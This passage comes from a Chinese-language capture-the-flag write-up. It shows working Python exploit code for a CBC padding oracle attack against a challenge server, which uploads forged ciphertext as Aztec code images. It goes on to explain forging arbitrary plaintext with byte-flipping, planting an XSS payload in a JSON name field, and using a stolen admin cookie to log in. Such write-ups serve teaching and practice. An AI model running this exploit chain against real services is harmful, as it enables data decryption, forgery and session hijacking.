            print(f"[*] index: {index}")
            for byte in range(0, 256):
                bytes_xor = b"\x00"*(16-index)+bytes([byte^index])+xor(plaintext,bytes([index]*(index-1)))
                new_cipher = cipher[:-32] + xor(cipher[-32:-16], bytes_xor) + cipher[-16:]
                b64data = base64.b64encode(new_cipher)
                code = aztec_code_generator.AztecCode(b64data)
                code.save(f"./pics/{byte}.png", module_size=4)
                f = open(f"./pics/{byte}.png", "rb").read()
                paramsMultipart = [('file', ('1.png', f, 'application/png'))]
                response = session.post("http://207.154.224.121:8080/upload", files=paramsMultipart)
                if response.status_code == 200:
                    body = response.content.split(b'')[1].split(b"div")[0]
                    if b"PADDING" in response.content:
                        print(f"[{byte:>3d}] Status code: {response.status_code}, PADDING ERROR")
                    else:
                        print(f"[{byte:>3d}] Status code: {response.status_code}, {body}")
                else:    # response.status_code == 500
                    print(f"[{byte:>3d}] Status code: {response.status_code}")
                    plaintext = bytes([byte]) + plaintext
                    print(f"plaintext: {plaintext}")
                    break
        return plaintext
## Recovering the Entire Plaintext
通过利用 Padding Oracle ，我们能够逐字节解密最后的明文块。我们还能再进一步利用吗？答案是肯定的。
一旦我们恢复了最后一个明文块，我们就可以扔掉最后一个密文块，并继续利用 Padding Oracle
来恢复倒数第二个明文块，以此类推，我们将恢复整段明文数据。
* * *
我们按照上述思路实施了攻击，并成功地恢复了整个明文，并发现这是一个json格式的数据。
    b'{"name": "12321", "surname": "123", "middle": "1", "time": "2021-07-26 13:37:00", "dest": "", "dep": "", "flight": "BLZH1337"}\x02\x02'
到这里，我们就可以猜到服务器端是如何处理上传的 Aztec Code
。在收到图片数据后，服务器将其解码为密文，对密文进行解密，并对解密结果解除填充。如果在解除填充过程中发生了错误，服务器会以 “
_PADDING_ERROR_ “ 的响应来回答。在解除填充后，明文会被进一步处理，可能会通过类似`JSON.parse()`
的处理。如果处理过程中产生任何错误，服务器会以 500 状态码来响应；如果一切正常，服务器会给我们发回一个 “ _Success_ “ 的 200 响应。
## Arbitrary Plaintext Encryption
恢复整个明文并不足以解决这道题目，我们需要进一步构造我们想要的任意明文的密文，也就是说构造一个密文，让解密结果得到任意我们想要的明文。
为了实现这一目标，我们需要将字节翻转与 POA 相结合，字节翻转攻击使我们能够将明文改变成我们想要的，而 Padding Oracle
可以作为一个解密器使用，帮助我们解密任何密文。
假设密文 `IV || c1 || c2 || c3` 解密为 `p1 || p2 || p3` ，我们想得到 `p1'|| p2'|| p3` 的密文。
我们首先将 `c1` 与 `p2 XOR p2'` 进行XOR，得到 `c1'` 。这样，`IV || c1'|| c2 || c3'`将被解密为`junk
|| p2' || p3'`。
生成的垃圾数据是完全随机的，这对我们来说是不可控的，而且含有不可控的垃圾数据会影响到 `JSON.parse()`
的解析，如果有不可见字符服务器会解析出错，并返回500响应码。那么，我们能用它做什么呢？还记得恢复最后一个明文块的 POA 吗？我们可以重新使用 POA
来恢复垃圾数据块`junk`。之后，我们再用 `junk XOR p1` 来XOR “IV”，得到一个新的
“IV”。这样，`IV'||c1'||c2||c3'`将被解密为`p1' || p2' || p3`，这正是我们想要的!
## The XSS Part
后面的 XSS 部分就是白给了。目前我们现在可以加密我们任何想要的东西，接下来我们应该怎么做呢？根据题目的描述，我们必须去获取一个监控系统的内容，并从中获得
Mr.Flag Flagger 的信息。并且结合题目给了一个上传扫码的接口以及明文块是 JSON ，很明显的一个 XSS 题目了，接下来就是我们如何构造这个
XSS Payload 了。
首先，我们得把生成密文的 API 参数与 JSON 参数的对应关系找出来。这个我们可以通过在 API 参数传入一些易于区分的数据即可，如下：
    URL:
    http://207.154.224.121:8080/finalize?lastName=1&firstName=2&origin=3&Gender=4&destination=5
    CipherText:
    8BAHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3N
    PlainText:
    b'{"name": "2", "surname": "1", "middle": "4", "time": "2021-07-26 13:37:00", "dest": "5", "dep": "3", "flight": "BLZH1337"}'
所以我们基本可以得到如下的对应关系：
  * lastName: surname
  * firstName: name
  * origin: dep
  * Gender: middle
  * destination: dest
但是我们应该把 XSS Payload
放在哪儿呢？虽然我们可以一个一个尝试，但是毕竟太麻烦了，仔细观察题目页面内容我们可以大概找到如下一个提示（虽然看起来并不算什么提示）：
    Passenger data
    Name:
    qweqwe
    -->
所以，我们可以尝试把 XSS Payload 注入到 JSON 的 Name 参数当中，例如：
    {"name": "", "surname": "1", "middle": "4", "time": "2021-07-26 13:37:00", "dest": "5", "dep": "3", "flight": "BLZH1337"}
但是我们需要注意的是，根据以上密码学知识，我们首先要在对应的生成密文的 API 处，生成一个 Name 长度与我们 XSS Payload
长度相同的密文，这样才能不至于解密出错。例如我们这里的 XSS Payload 长度为 40 ，所以我们也要生成一个 Name 参数长度为 40
的密文，也就是需要我们首先在生成密文的 API 传入一个长度为 40 的 firstName
参数，并且为了保证其他参数加载到页面时保证页面正常，我们最好不要改动其他字段，让其他字段保持默认值即可。（血泪教训
    URL:
    http://207.154.224.121:8080/finalize?lastName=1&firstName=0000000000000000000000000000000000000000&origin=3&Gender=4&destination=5
    PlainText:
    b'{"name": "0000000000000000000000000000000000000000", "surname": "1", "middle": "4", "time": "2021-07-26 13:37:00", "dest": "5", "dep": "3", "flight": "BLZH1337"}'
在我们得到密文后，我们接下来就需要使用 Padding Oracle 和字节翻转来改变密文对应的明文， 然后使用 base64 编码一下，再用 Aztec
Code 编码转成图片，并通过 upload API 上传图片即可。最后，终于打到了 Admin ！
拿到 Admin Cookie 以及对应页面内容之后，我们可以直接用 Admin Cookie
登录到该页面。登录之后，发现该页面只有一个搜索的功能，一开始我还以为是个套娃题，还要 SQL 注入，结果最后按照题目提示搜索了一下 Flagger 就拿到
flag 了…
整体来说是个密码题，跟 Web 没多大关系～希望密码学选手看完后有所收获23333（因为 Web 部分纯白给，Web 选手就是帮检查检查哪里出错了，然后跑跑
exp ，等等 exp 就行了，该说不说，跑个 exp 还得跑个 1.5 小时，确实折磨～